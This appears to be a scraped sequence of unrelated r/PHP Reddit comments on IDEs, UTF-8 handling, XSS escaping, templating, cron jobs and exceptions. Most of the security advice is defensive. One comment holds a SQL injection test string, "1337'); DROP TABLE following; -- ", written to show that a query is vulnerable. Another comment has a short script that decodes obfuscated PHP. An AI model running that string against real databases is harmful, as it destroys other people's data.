On "transactions" - [that's really a feature of mysql itself](http://dev.mysql.com/doc/refman/5.1/en/ansi-diff-transactions.html), and not something PHP can force upon the mysql DB. I wouldn't recommend getting into that sort of thing (ie Mysql's InnoDB storage engine) unless you're studying Mysql, are a Mysql DB admin, or are on _very_ good terms with your app's Mysql admin.
I've tried Aptana and it requires you to login everytime the software starts. That's an immediate red flag for me.
Any Eclipse based IDEs for PHP is sluggish.
Yes, there are other less-spoofabe ways. For example, you could detect the cipher list the browser sends to the server during an SSL handshake. Different versions of browsers use different ciphers lists varying in length, algorithms listed, and order. 
Because (i'm guessing) you only have records in `following` for users you ARE following, not for every single user. Let mysql do the work: SELECT `id`, `username` FROM `users` WHERE 1 AND `id` NOT IN ( SELECT `user_id` FROM `following` WHERE `follower_id` = ? ) AND `status` = 'active' ORDER BY `username` 
In a templates/clients.tpl.php (included from your index.php script if $_GET["action"] == "clients" ): $clients = new client ( array ( "order" =&gt; "ASC", "by" =&gt; "name", "ini" =&gt; 0, "num" =&gt; 10 ); or maybe: $clients = new client ( array ( "order" =&gt; "ASC", "by" =&gt; "name", "ini" =&gt; $_GET["ini"], "num" =&gt; $_GET["num"] ); and then: $clients-&gt;render ( "client" ); // render each client with template client.tpl.php In includes/client.class.php (or parent recordset class): function render ( $template ) { for ( $this-&gt;i = 0; $this-&gt;i &lt; $this-&gt;num_rows; $this-&gt;i++ ) { include ( $GLOBALS["path_template"].$this-&gt;name."/".$template.".tpl.php" ); } } function get ( $field = "" ) { if ( empty ( $field ) ) $field = "id_".$this-&gt;name; // $this-&gt;name == get_class ( $this ) in constructor return $this-&gt;rows[$this-&gt;i][$field]; } In templates/client/client.tpl.php (client class templates): &lt;div id="client"&gt; &lt;?php echo $this-&gt;get (); ?&gt; // echo id_client &lt;?php echo $this-&gt;get ( "name" ); ?&gt; // echo name &lt;?php echo $this-&gt;get ( "surname" ); ?&gt; // echo surname &lt;?php echo $this-&gt;get ( "any field in client table" ); ?&gt; &lt;/div&gt; In short, php is a template engine, just use include in your render methods. 
Slightly off-topic, but you may want to test your code with: show_users_yournotfollowing("1337'); DROP TABLE following; -- ");
One thing you should do when adding jQuery (or any other script from google) is to check if it's available, like so: &lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"&gt;&lt;/script&gt; &lt;script&gt;window.jQuery || document.write('&lt;script src="js/libs/jquery-1.7.1.min.js"&gt;&lt;\/script&gt;')&lt;/script&gt; Failing to load from google is not common but it can happen and with this you have a fallback :)
If I can make a couple more reccomendations: * [FuelPHP](http://fuelphp.com/) - MVC framework, like Rails * [Slim](http://www.slimframework.com/) - Microframework, like Sinatra Both of these frameworks are fairly lightweight and quite fast.
I'd say this is very ontopic and it's good that you mention this before people think OP's example is acceptable coding.
Yep, but the new release process is for 5.4+. As such, 5.3's life has been discussed separately as per previous comments.
That source looks credible, in real life we still fall back to single quotes cuz the size of strings which we use are more than a kilo byte, let me check and get back to you on this :)
TL;DR: htmlspecialchars($input2, ENT_QUOTES, 'UTF-8'); Rest is filler via attempted humour with the punchline being "dolphins are smart" 
If you're talking about Aptana then I agree. However, using straight Eclipse with the PHP Developer Tools package works fine. I don't notice any sluggishness.
Lookup short_open_tag in your php.ini
I take it you decided to quit working on it?
aaaaaand... that was it. So why isn't that set to "On" by default? Infuriating. P.S. that saved me a f*ckton of troubleshooting. I would give you a million internets if I could.
I will probably just do that. I inherited this code, and I haven't the time to mess with it until after the move to the new server.
I just tried it. Create a "project" with Kohana, but noticed that I couldn't do things like auto complete or browse to source of a method like I can in netbeans.
I don't mean to be a dick but after reading the first paragraph I'm content to just walk away from this with ustanik's TL;DR.
Just for clarification: I didn't write the article, so you're not being a dick to me, no worries.
OWASP has a pretty nice introduction to XSS and prevention too: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
It's a parameter. Typically someone would execute a query like that with PDO and let it take care of escaping and quoting for you. The example you posted in the OP is vulnerable to SQL injection attacks (see simoncpu's comment http://www.reddit.com/r/PHP/comments/qu4vb/i_have_this_function_that_shows_which_users_i_am/c40id79)
Why should be on by default? I prefer the long option &lt;?php, but anyway once you start using &lt;?php you forget about &lt;? and don't worry anymore
Most core devs are in #php.pecl on efnet ;) I think that's even the official PHP developers channel.
Short tags cause all sorts of problems. The one I encounter most frequently is that the xml declaration (&lt;?xml...) makes the parse think that it's time to do php.
Like krues8dr has said, it's annoying as it breaks XML and stuff, meaning you end up doing ridiculous things like echo '&lt;'.'?xml'... It's really handy for doing &amp;lt;?=$val?&gt;, for example though. I always try and do &amp;lt;?php but the errant short-tag echo is usually the one I miss! I'm sure someone could probably write a script to check these and report files which have them
In 5.4 the &lt;?= always works as &lt;?php echo which is nice :)
This guy has it right. Use parameterized queries for inserting to the database - only thing I ever do on INSERTs is to make sure to trim whitespace before and after. Worry about whether or not it's safe from XSS later. Otherwise, if you ever change your mind about what constitutes a security vulnerability later, you'd have to resanitize all your data. Not a sustainable solution. Always use an abstracted function / method to escape user input when you're sending it to the browser, as XSS is a little more difficult to circumvent than SQL Injection (provided you always use parameterized queries). Here's what I currently use to prevent XSS: htmlentities(mb_convert_encoding($string, 'UTF-8', 'UTF-8'), ENT_QUOTES, 'UTF-8'); In Zend Framework, you can set the view helper escape function in your bootstrap like so: $view-&gt;setEscape(function($string){ return htmlentities(mb_convert_encoding($string, 'UTF-8', 'UTF-8'), ENT_QUOTES, 'UTF-8'); }); [Use this StackOverflow question as a guide.](http://stackoverflow.com/questions/110575/do-htmlspecialchars-and-mysql-real-escape-string-keep-my-php-code-safe-from-inje)
I have removed your comment. Do not post this sort of thing here, again.
[Stackoverflow.com Response](http://stackoverflow.com/questions/1185605/when-to-use-static-vs-instantiated-classes)
The gcc44 error is telling you that you need GCC 4.4 or greater installed. If you do gcc -v you can see what version you've got. 4.4 is pretty new so you might have to dig around to get it. I doubt if you're using aptitude or yum that the repos are up to date with 4.4, so you may have to compile it yourself. Looks like you'll also need libcurl ;P
What can slip though?
The static keyword declares whatever you apply it to (be it methods or properties) to be the property of the class, rather than the property of an instance. For instance, in the former example, you've declared all cheeses to be stinky, while in the latter, you've declared one specific cheese to be smelly.
This. I've been using XSL transforms in my projects for a couple of years and I've yet to see any real downsides. Since XSLT is a standard, I can take my knowledge between platforms (I work with ASP.NET for work), it prototypes _very_ rapidly once you understand the syntax, and it's more functional and flexible than most other templating frameworks I've toyed with. EDIT: Also, simply by its nature, display code and logic code are kept separate.
I tried phpstorm and just didn't seem to click with it. Not as fast as I thought it would be and I couldn't set it up properly. I work from a shared network folder (either from a virtual machine or actual pc) and it couldn't handle that. Netbeans and Nusphere have no problem working like this and there is no slowness because of the code being on a shared network folder.
not what you want to hear, but use a service like mailchimp. it's free. they have servers that aren't blacklisted and can do other metrics and statistics on opened/forwarded/etc. which will be far more useful to you.
&gt; eliminating bottlenecks will get you nearly as much of a speed increase This needs to be emphasized more. Common programming errors are easy to make when dealing with large quantities of data (cases where your scripts consumes hundreds of MB of data rather than tens of MB).
Whatever useful information this article has is simply lost in the author's poor attempt at humor, Hitchhiker's Guide references, and all the other similar nonsense.
Wow, you're absolutely right; it's in the [Changelog](http://php.net/ChangeLog-5.php)! You sir, have just made my day. Thank you!
You know, being the hobbyist I am... I never knew really what Netbeans was but I always assumed it was a licensed product. I'm pleased to see that it is not and will promptly be giving that a try when I get home as well. That said, I'm really in love with the Sublime interface and I really don't care too much for Java based apps so we'll see. For my small little projects, the scope of what Netbeans can do is probably overkill.
I use wget -q http://mysite.com/the/url/to/the/cron/job EDIT: Sorry, I should clarify more. If you use an MVC, this is the easiest way to handle it.
Na... they're on par. If I remember the exam was full of questions that were easy if you knew the answer, however it was important you had every function memorized or at least a good portion of them memorized because you would get questions like this. What would the result be: $array = array(0 =&gt; 'blue', 1 =&gt; 'red', 2 =&gt; 'green', 3 =&gt; 'red'); $key = array_search($array, 'green'); in this case you would get an error because the needle and haystack are switched. You'd get the key return of 2 if you called it this way $key = array_search('green', $array); // $key = 2; So ya... theres quite a few questions like that, they're easy if you know them - but to prepare for them can be kinda annoying.
just because most MVC's use an index.php file or similar file to bootstrap all of the dependencies. If you access the controller file directly, I doubt it will work.
I think you're thinking about [Gearman](http://gearman.org/). We use this for much of our background processing. It's pretty easy to use, I think.
how do you make it work? I suppose you could do php -q /path/to/script/index.php?path/to/controller But I don't know if that would even work, I'm just throwing it out there.
Please do not lawyer me about what will and will not be permitted to be posted. I'm asking that you not link to, or direct people to content where the person distributing it does not have redistribution rights. I'm not an anti-piracy guy. I myself torrent various media. But, it is an entirely different matter when you're posting content like this, where the author will see immediate and substantial losses to their income due to piracy. It's a dick move, and I would ask you not to do that.
Settle down mate, I'm not attacking you here. I've lost sight of the point you're trying to make - I'm seriously trying to understand what you're getting at. There's no need for the ad hominem attacks. The controller sets up the template and passes the data in. You said it's a problem. I asked which part of your application processes the request and otherwise performs that job, you get upset. Regarding portability, you're right, if I had a polyglot web application I probably would use a portable templating system at least to render the layout. However, it's very rare to have two different applications to render a page and if you need a particular language for a feature it's usually better to implement it as a web service and have your frontend communicate with it i.e. Service Oriented Architecture. How does using PHP as a template solve the above regarding standards and portability? The last time I saw XSLT used in templating was in a in-house java framework in the early 2000's as we were migrating to Velocity. I've seen no other web application, framework, example or anything use it since then. XSLT is good for turning XML into other XML, anything else is usually better solved elsewhere. Here is what I'm saying... Given you have a PHP project, why wouldn't you use a templating system that is: * A very, very simple domain-specific language that is more concise than raw PHP * Supports more than enough logic for display purposes * Keeps you closer to the medium at hand (HTML) * Provides modern templating features that you would otherwise need to implement yourself (inheritence, blocks, escaping, helpers, autoescaping) For very little conceptual and performance overhead.
Since I asked the question before and only got attacked in response: How do you set up the XSLT template and pass your data in?
Hmm, that's interesting. I don't like the looks of the particular implementation, but the idea is quite interesting. Although (correct me if I'm wrong) it seems like XSLT is just a template-renderer (implemented in a number of different languages) that uses a language-agnostic data structure - XML in this case. So if we changed Twig (for example, as we were talking about it earlier) to instead be run as a server (I'm not quite clear on how this works with XSLT?) and take in JSON as an input, you'd be ok with that?
Thank you, thank you, thank you for finally addressing the outright lynching of StoneCypher by people w/ sockpuppets! 
Before we go any further, please understand that I am not interested in hassling you over this, and I consider this specific matter to be over. I will comply with your request. But: &gt; where the author will see immediate and substantial losses to their income due to piracy. Honestly, I disagree with this sentiment. I am helping promote a book at no cost to the author, who will likely produce revised editions and write other books. Had it not been for my "piracy" of this material, I would have never have purchased it, and in turn, I know that I've gotten seven others (not including my last employer, who bought a new copy to keep in the office) to purchase the book, based upon my (and in regards to the employer, our collective) recommendation alone. The author wouldn't receive losses to their income and would find a deeper market penetration. There would be no immediate loss to their income. Those who would download the file would be the exact same people who would just buy a used copy of the book to avoid paying full price or, even worse, never bother reading it. But a large percentage of those people will pay full price for a newer revision that covers, in this instance, PHP 5.4. I express this because you're saying I'm acting like a dick when I view it as a win for both parties, especially for the author. And if you want to ignore my response, feel free, and I will consider the matter closed.
Right, but if you're both lead programmer and webmaster, I think you're safe :)
I don't necessarily disagree with you. In fact, I agree with you about how authors can see gains made through piracy of their content. However, I believe that's up to the content producer in many cases. It's certainly not a black-and-white issue. I probably wouldn't even have bothered with it if not for the fact that I received a request from someone who I know and respect, to have the link taken down. I believe he knows the author personally, and so probably knows the author's wishes in that regard.
If it makes you feel any better, the TL;DR is sufficient. The problem is that the number of otherwise intelligent people who disagree continues to swell. Any search of Github or basic XSS intros or even general PHP articles insist on skipping the encoding parameter. P.S. Don't worry about being a dick, I know the writing style isn't to everyone's tastes ;)
Easy, always serve HTML with the correct charset. UTF-7 is only exploitable when a charset is either unset or set to an invalid value. For example, UTF8 is invalid but UTF-8 is correct - easy mistake to make.
Other good links to OWASP: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet 
I would upvote you for either paragraph separately. Unfortunately for you, I can only give one upvote. :(
Please re-submit your submission without using a URL shortener. They are not permitted.
"As for the reddit plebes, they can go bite me" -- editors note in the comments
Gearman appears to be the standard. It's a shame it has such a sucky admin interface. I mean, I'm ok with using telnet. But about all you can do is view the number of jobs queued of various kinds. Want to clear out a job? Restart gearman. Want to clear out all of a particular type of job? Restart gearman. Want to clear out all jobs? Restart gearman. :/ [Celery](http://celeryproject.org/) is a pretty cool-looking project written on top of RabbitMQ (or, alternatively, Redis/MySQL/flat-file/other). [Theoretically](http://celery.readthedocs.org/en/latest/faq.html#is-celery-multilingual), you can use it with PHP, although I haven't looked too far into it. Edit: Github provides [celery-php](https://github.com/gjedeer/celery-php).
I find Eclipse's PHP Plugin to be easily my favorite id ever. Worth a download.
Why are you so insistent on making sure you serve the user the content you choose? Why are you so worried that they might make the choice to view the other content? Anyone technically competent enough to do user-agent spoofing is technically competent enough to realize "Hey, the desktop site doesn't work on my phone. Maybe I shouldn't do that." I'd venture a guess that you're doing something else wrong if you're so worried about this.
Seen this recommendation a few times, so I just went and downloaded it. Is there a single 'off' button to tell it to stop mangling my code as I type it? Or do I have to go hunt down and turn off every single of the thousand options related to autocorrect/autoformatting/autoinsert/autononsense? Other than that I'm not totally hating it so far, which is a huge leap forward from every other IDE I've tried.
I think it's pretty awesome, I jokingly call it "abuse" knowing what other developers must think of it. At any rate, I tried altering your idea a little to [use a while loop instead of goto](https://gist.github.com/2026285#file_class.v2.php). (I just removed the globals so I could focus) **edit** My bad, I see you're way ahead of me: https://github.com/bungle/web.php
Really, the only proper solution is to re-encode every piece of **critical** user input into your desired charset, and then escape even that. UTF-8 in, UTF-8 out. UTF-7 in, garbled escaped (but safe) out.
I am sorry for my aggressive responses to your article. You did donate it to the world, after all, and I owe you an apology for assailing something you published freely, for what I can assume you meant to be for the betterment of all.
OK, what do you have in // Handle the negative return?? I would have `throw new CustomException('Msg');`. Also, you still didn't address my rebuttal that even though I know it may add "a few milliseconds", why that is so horrible? It really does smack of "pre-optimization" to me to be worried about that sort of stuff.
Because they want it to look like the results are coming from www.theircorporatebusiness.com, not corpbiz.mysite.net. That way, they can run their own privately-hosted CSS, JS and Flash on the same domain, even via https:// without any security penalties or SEO problems. Makes sense, right?
I would be honored if you could post below your more elegant solution. I would thoroughly enjoy learning what you have to offer.
[Here ya go.](http://www.reddit.com/r/PHP/comments/qkahh/what_are_some_advancedexpert_level_php_tips_or/c3yd5k6)
There's a lot of pro/con debate that I'm only lately wading into. I was always taught that the very purpose of an Exception was to trap an Exceptional Circumstance--something that the processor, or operating system itself, is just going to throw up its hands and say, "I don't know what the fuck you want." Null pointers/segfaults, division by zero, that type of thing. In the intervening seven years a lot of practice has developed that's been towards using Exceptions for any deviation from happy-path. I don't agree with it, because I think other design practices could better provide for handling the non-error deviation from happy-path (e.g.: when I ask Java's Hibernate for a multi-row database query, if there's nothing that matches, it throws a NoResultException, instead of just giving me an empty Collection. I think the empty Collection should be just fine--Iterators will just skip straight over it, type of thing). I can see certain performance arguments supporting this practice--I don't have to check result sets against null, because I know if it didn't throw(), then it's populated--but that doesn't make it universally appropriate, and my concession to performance in this particular case is due to a lot of practice within the language core, and with industry-standard packages, that I have to work with, not against. Personally, I find try-catch blocks to be visually messy and complicate my reading the code. In the case of input validation, I think using exceptions is borderline retarded, because failing at the first invalid input, due to an inappropriately-placed `catch`, is a shitty user experience.
I an understand how that would work if dependencies were included, but I don't think it would work of I pointed it directly to a CodeIgniter controller, because it wasn't given a command and no functions were bootstrapped to it. That is what I am referring to, because the OP said they are using an MVC. I guess it would just depend on the MVC they are using.
/usr/bin/php /path/to/application/public/index.php controllername methodname "arguments" http://codeigniter.com/user_guide/general/cli.html
I suppose.. I'd be inclined just to point a subdomain to your servers like app.theircorporatebusiness.com or something.. but I can see there might be security problems and stuff..
Round we go, but I'm game ;-) I want to learn. ---- OK. Performance isn't your main concern, but it's the only one you've listed. Why else do you care about using exceptions to control the non-ideal, even rare, path, such as the customer searching for something that doesn't exist?
Nothing keeps me from doing that with exceptions, either, except intent.
Very cool! This is very good to know. Thank you for pointing me to this
If you haven't tried it already, you might give [APC](http://www.php.net/manual/en/apc.installation.php) (opcode cache) a shot before you get into the world of HipHop. Installing each component and building from source is far less difficult than it initially appears. Just wait for each error message to inevitably pop up, google the error to find out what library or variable is missing, and then try make-ing again. A couple hours of good learning to be had. ;) With yum, you can probably find most of the missing packages pretty easily - but to get the right version, you may need to build from source, of course. If by cPanel you mean Shared Hosting, then you probably can't install PHP 5.4 - that's up to whoever maintains the server.
&gt;OK. Performance isn't your main concern, but it's the only one you've listed. Oh, for crying out loud. I made an entire list of reasons why it shouldn't be used 5 days ago. This is something which is brought up in the first year for CS students at the university. If you want to learn, I suggest you take a course or two. Or you could simply google it. try "Exceptions control flow" and "exceptions exceptional circumstances" etc. I got work to attend to.
Yeah I've had APC running on my company production servers for a few years now and there was quite a noticeable load drop (mostly CPU). I'm not sure how much of that is attributable to APC though since I added Memcache usage with that same launch. Hiphop has just intrigued me since I first read about it but it seems my lack of administration skills may defeat me in this instance.
You MUST set the project to remote host webserver, files via network share / mounted drive. PHPstorm will then setup a local copy.
You really need to change that navigation bar. http://www.w3.org/WAI/WCAG20/quickref/#qr-visual-audio-contrast-contrast Also, you might want to add an editor. Some of us like to use tab for indentation, and it's a pain having it switch focus. Plus live syntax highlighting wouldn't be bad. http://ace.ajax.org/
First look: Pastebin has one thing much much better: No Captcha ! This thing is a pain in the ass for something you are suposed to use in a fast way. I don't think you really need that as even if there is a little spam, it shouldn't cause much trouble. EDIT: Maybe the comment part could be a problem without a captcha, but still it's pretty anoying
You should remove C as the default Syntax highlighting option and require people to explicitly choose the option they want. (i.e. -- Choose One -- )
Good point I will make a ticket for it.
That is a neat feature, to be sure. The collaborative nature of it is handy - but in the end it's still just a pastebin with less functionality overall than the others out there.
I wrote a reply to this: http://labs.stoysnet.com/2012/03/cross-site-request-forgery-and-htmlspecialchars/
Thanks, I hope to win you over eventually :)
I haven't used Zend_ACL, well actually Zend_*, but I imagine it can't be worse than this.
PHPStorm - Do it, pay your $50, don't look back. Most of the clutter can be hidden and has great debugging and refactoring support. It's java-based but perfectly performant. Has VCS integration built in etc... Give it a go, there's a trial.
I can find like 5 links to lead me to posting my own code. A sustainable site like this is going to have more of a problem maintaining competent reviewers than it is getting people to dump their code on there... There's no obvious place to go to review stuff. There's a few links down the side ('Latest Reviews'), but the title 'Latest' implies that is not all of them. Why is there no menu option to list reviews? Or a 'See All' link?
Try beanstalkd for a change then.
It's using Rainbow Tables to crack these passwords, it's not decoding the hash.
Snore... rm -Rf 
I prefer Netbeans overall, because it seems to tick every box, if not most, but I used to use a lesser known IDE called [PHPEdit](http://www.phpedit.com) back in the day when I was still using Windows and it had some pretty decent features. Check it out. It's not free, but you can trial it to see what you think. Not sure if this is still available, but I seem to recall you used to be able to get a free version if you could show that you are a student.
He/she might also consider putting the "view" code into a seperate file - or adopt a proper MVC framework ie. Symfony, Zend Framework, etc, but it's not clear to me whether this person is just writing a small script or if this is part of a bigger project, in which case a framework would make sense.
In other news: PHP can do MySql select queries. Read all about it.
Were you using the Jobeet tutorial? When you first start using a framework there are a lot of things you won't completely understand. It's similar to learning a new language for the first time with the benefit of being able to use the tools you already know. It's great you see the benefit of splitting the logic from the display. With web design its ideal to write code you can use on multiple websites.
&gt; FEATURES &gt; Sidebar (Easily create a sidebar that appears on all pages!) I'm so buying that, I've always wanted my own sidebar.
I agree, someone pointed me in the right direction below of how to handle cron jobs using codeigniter. Never again will I use wget :)
Would this work together, as in the barcode in the pdf?
I would think so, since the barcode class should give you an image, and you can draw the image to the PDF. http://zend-framework-community.634137.n4.nabble.com/How-can-we-pass-a-Zend-Barcode-image-to-a-Zend-PDF-tp1478435p1478470.html
Unicode. Unicode always. (utf-8) Always. Web server should be serving up "Content-Type: text/html; charset=UTF-8". A fallback is to specify in the HTML headers: &lt;meta http-equiv="content-type" content="text/html; charset=UTF-8" /&gt; edit: this very page has both.
Could you try: &lt;meta charset="utf-8" /&gt; in the &lt;head&gt; section of your HTML, and &lt;?php header('Content-Type: text/html; charset=utf-8'); ?&gt; at the top of your PHP script, and report whether it works after that? If that doesn't work, try: &lt;meta charset="iso-8859-1" /&gt; and &lt;?php header('Content-Type: text/html; charset=iso-8859-1'); ?&gt; Between one or the other of those, it should work... Be sure that the content type going *in* to your database matches that of the output. It appears there is some disconnect there. Character encoding can be a nightmare, it's generally a good idea to stick to UTF-8 in and out. EDIT: I got downvoted for this?? http://i3.kym-cdn.com/photos/images/newsfeed/000/266/030/492.gif I really like browsing Reddit, but I'm not off to a good start at all with posting :( OP, really curious about the results if you try the example code I posted...
You can control character encoding of a webpage with a header tag. Also there is nothing wrong with using HTML entities. http://en.wikipedia.org/wiki/Character_encodings_in_HTML
Both graphing libraries called "pChart" and "jpgraph" offers code 39 and 128 barcode functionality. [pchart.net](http://www.pchart.net/features-extended) [jpgraph.net](http://jpgraph.net/) I've used jpgraph to visualize database information, but barcode requires a pro version. pchart allows free barcode usage (I think), but I have not used it before as the library (pchart 1.0) did not support image maps at the time.
As everyone is going to say, utf8, but it's not just about the meta tag in your html. Make sure your database is set to utf8 also as mysql defaults to latin1 and converting later is not always a simple task. Even your PHP db connection should be set to utf8 (mysqli::set_charset if using mysqli). Basically every part of your development stack should be set to utf8. If any of them are doing what they want things can go squirrely. (As I'm sadly going to have to deal with soon overhauling an old website.)
No. It's the code. To be portable between server configurations, you shouldn't dependent on any of PHP's optionally-bad behavior. (Short tags, register globals, etc.)
I have to stress this. Be sure that your database has its character set on utf8_general_ci or anything like it, and your connection set to UTF8 as well. Immediately after making the connection, you can run this as a standalone query to set the connection to UTF8: "SET NAMES utf8". For example, if you're using PDO and your connection is on $conn: $conn-&gt;exec("SET NAMES utf8");
I'm just here to provide (admittedly unsolicited) advice regarding code style I see here. I don't mean to judge ( I've been there before) just offer some of the fruit of my experience, feel free to ignore me (though I hope you won't). Your schema is based on user name, and not an ID? So, users lose their post history if they change user name / cannot be allowed to change their username? I don't see any attempts to prevent malicious content on output. (Filtering on input is nice (if you are doing that), but you should still filter on output.) The mix of styles with markup with behavior makes me glad I don't have to maintain it. Once you start doing this as a habit you will immediately benefit, even if you're just a one man team and nobody besides you ever needs to see your code. I mean, you - at best - had to hit copy-paste a bunch for that row color, when you could instead have a single CSS rule to do the same in two seconds. There's no way you wouldn't save time. Delete link should be a link, aka &lt;a&gt;, with a background image if and when you decide it should be an image. Changing how it looks, including if it's an image or not shouldn't require changing the markup. As it is now (no text) Ctrl-F can't find it and screen readers can't read it. (Maybe you don't care if your site is accessible, but this amounts to going out of the way to break things for the blind.) Short tags are a bad habit, and if you ever need to deploy this code on a server without short tags enabled (disabled by default) to which you don't have access to change the configuration, you're screwed. Just because you can doesn't mean you should. if ($whatever == 1) should simply be if ($whatever) unless you really do want to test literally for the value of 1. TRUE would be better except that if $whatever is "true" but not intended to be, that should be considered an error. die() on database errors might be useful to you as a developer, but you should really log those sorts of messages somehow and just raise an HTTP status code. This allows for the web server to fall back to an error page, and lets user agents know that something is wrong, that this is not a "OK" response (search engines will not cache/index errors, etc.) Many analytics or monitoring suites can also alert you based on sudden spikes in error status codes. I'd change the name of $rows as it's only ever a single row. Even better would be to name it what the row represents ($post, maybe).
Why does it have to be a pdf? If all you are doing is printing it, then just make a standard webpage with an image. Is there an additional requirement you did not mention?
Anyone can CLAIM an anonymous post then delete it. No point to Anonymous posts at this point. Would suggest generating a claim-code when the Anonymous poster posts, which is saved in the user's session and shown only to the poster (on the post, preferably). If the original poster wishes to claim it they can do so while their session persists or later by some interface to allow you to enter the claim-code after their session has been blown out, if they can enter a valid claim-code. It's a lot of work and probably not worth the feature to "claim" anonymous posts.
The barcode labels that I am printing to is custom sized, 2.5 inches by 0.5 inches
Interesting idea, and you are right any registered user can claim an anonymous post and delete it. I feel like that would be more of an incentive to not leave anonymous posts though, and instead register and leave comments that can't be claimed. It could be argued the other way too I guess where whats the point of commenting anonymously if someone is just going to take it and delete it. This was more of an experiment to see what people do. If it starts to become an issue I will take it out but right now I am going to leave it and see what happens. Thanks for the feedback. 
He's saying to make sure it IS set to that (or anything like it). I need to remember to do this as well, it seems the default is usually latin1_swedish_ci, which has never caused problems, but might as well go with UTF-8. The thing about OP's issue, though, is that his data might not be currently stored in UTF-8, even though it would be preferable. He could either write a separate script to go through all his data, make it UTF-8 and re-store, or make the browser output match whatever encoding is stored. That's my understanding.
This is looking to be quite good. Thanks for the suggestion. I am just looking for the documentation for custom sizes of pages.
Interesting, thanks.
utf8_general_ci is faster but there are some problems when you try to compare, sort, etc. values. That's why there are some for specific languages. There are some languages where a special character is stored as two values instead of one and so on. In the MySQL page there is a chapter that talks about this and have some examples with German I believe. Good luck.
set UTF8 in database, send UTF8 headers. moving on.
I think in 5.4 it's always on, as opposed to being optional in previous versions.
This is basically what I was going to say. Another thing to consider is the actual data you are populating database with. If it comes from some kind of CSV file, or possibly even a MySQL dump file, the the encoding of the file *itself* should also be UTF-8. I've had cases before where I was getting encoding issues, double checked that everything was using UTF-8 end-to-end, only to realise the data itself had not been stored as UTF-8. Very confusing. In the case of MySQL, if you have existing data stored as ISO-8859-1 (latin1), I believe there are MySQL operations that can convert the data for you. A MySQL dump may contain latin1 encoding information and hence may still be useless until it has been properly converted.
The others are right about making sure that the database is UTF8 and the web page specifies UTF8. But the big thing that is often forgotten - *the actual content has to be UTF8-encoded too!* Just using a meta tag or header doesn't mean the file is automatically UTF8. You have to convert it. In Notepad++ there is an option for that (if you play around you will see a difference between "use UTF8 encoding" and "convert to UTF8"). Anyway make sure your PHP files and the content in the database is actually UTF8.
Yeah but if I use PHP to set the content type to UTF8, wouldn't the HTML page automatically be UTF8. Wouldn't that be enough? Everyone is saying UTF8 for databases, PHP, and HTML. Doesn't that cover all your bases? 
You're calling *unpickArray* recursively, but **not returning the results to the calling parent**. Variable scope is tied to the called function, so $keyArray and $valArray aren't getting filled with each nested iteration - just locally. You need something like: list($keyArray, $valArray) = unpickArray($b); But overall, this is a really ugly bit of code. array_push() is considered less readable than the syntactical sugar of **[]**. &gt;$k = key($a); Try getting rid of that nastiness and use this as your foreach instead: foreach($a as $k=&gt;$b){ Also, try to avoid renaming all of your variables before using them, it makes things way confusing.
No, the files need to be encoded that way. You can't just serve up an ISO-8859-1 encoding and tell the browser that it's UTF8 because it's not. For basic ASCII it works fine but other characters like your ° may not. Note, if your PHP/HTML files don't contain any of these characters (they're just ASCII and the UTF8 characters are all in the database) then you should be fine I think.
Damn I love it for converting reports that are generated into proper PDF through the php lib snappy :)
You're not assigning the pushed array to anything. Pass the array by reference array_push(&amp;$keyArray, $k);
This works fine **as long as you're running the HTML5 doctype!**
I don't believe that's right. Check the docs: php.net/array_push
 int array_push ( array &amp;$array , mixed $var [, mixed $... ] ) Looks like they're passing by reference too
That means that it is treated as a reference, you don't pass it in by reference. array_push($array, $val); is equivalent to $array[] = $val;
I thought it worked on all browsers, in a similar way to the doctype (it works on IE6 and puts it in standards mode, though IE6 doesn't actually recognise HTML5).
Yes, pagelets is more useful in single page app type of things where you are already heavily depended on javascript. It's kind a like delayed execution, and it doesn't have many uses in normal web sites. That phunction is something I definitely want to learn more about. At first sight it looks more like a black art to me. Interesting piece of code. Is it PHP 5.4 only? I wish there was examples or documentation for it.
Yeah this fixed it. I knew just leaving the recursive function there by itself wasn't quite right, but it appeared to be working. the list() approach doesn't add to the array though, it just overwrites the whole thing with the last record, so I hacked around it with some horrible ugly monkey code and now it works $c = unpickArray($b); foreach($c[0] as $i){ array_push($keyArray, $i); } foreach($c[1] as $i){ array_push($valArray, $i); }
Okay that's what I thought, thanks
I didn't mean to see you did. It was just a venting of general frustration..
Sorry, I should have mentioned that you'll need to pass in your $keyArray and $valueArray into the function for that to work - then you're just appending at every level.
I do that far too often. Carry on then
REDDIT, THANKS FOR YOUR HELP! I'm in the process of looking into UTF-8 and converting all aspects of my stack to use it. Thank you all for the heads up. ** (: ¡¡¡dןǝɥ ɹnoʎ ɹoɟ ɥɔnɯ os noʎ ʞuɐɥʇ 'dɥd/ɹ ** &lt;---- EDIT: Hmm... for some reason the upside down characters breaks the markdown code from making this bold.
php is still pretty standard. modx is a good cms built with it. i use both all the time.
A couple thoughts: * I don't like the way the comments break the flow of the code. * The comments should be collapsible, with a mark next to the line number letting you know how many comments exist for that line. * I rarely need to comment on a single line of code. Much more often I need to comment on a whole block of code. * One of the other more popular pastebins could add a commenting feature, and you'd be left in the dust.
On a lot of platforms (C/C++), switch is faster than if/elseif because it's compiled to a jump table. In PHP, the difference is probably insignificant either way but it's equally possible the switch is slightly faster. Don't worry about such micro-performance issues and use which ever construct is most readable for the situation.
I've always used fdpf which supports embedded fonts to get around this.
If your antivirus is flagging non-threatening files you should fix the antivirus, not the files.
That was easy &lt;?php if(!isset($argv[1])){ die("usage: decarb.php &lt;obfusicated code&gt; &lt;unobfusicated code&gt;"); } $raw = preg_replace("@\n@","",file_get_contents($argv[1])); preg_match("@\(\"(.){1,}\"\)@",$raw,$matches); $data = substr($matches[0],2,-2); $offset=gzinflate(base64_decode($data)); $output = ""; for($i=0;$i&lt;strlen($offset);$i++){ $output .= chr(ord($offset[$i])-1); } if(isset($argv[2])){ file_put_contents($argv[2],$output); } else { echo $output; }
Comments are collapsible. Click the speech bubble at the top to collapse them all or the red tab on the right to collapse a group. Multi line comments have been a major request and I am looking into doing that. If a more popular pastebin were going to do this they would have already done it. As it is chances are they will only do this after I have gained some market share if this idea takes off so I am not too concerned about it.
I this case, open sourcing it was a [horrible idea](http://www.reddit.com/r/PHP/comments/qxwdt/obsfucate_php_to_hide_from_av_and_prevent_reverse/c41c8nr).
Use what expresses the intent of your code better and avoid the trap of premature optimization.
Hahahaha golden. Thank you for that.
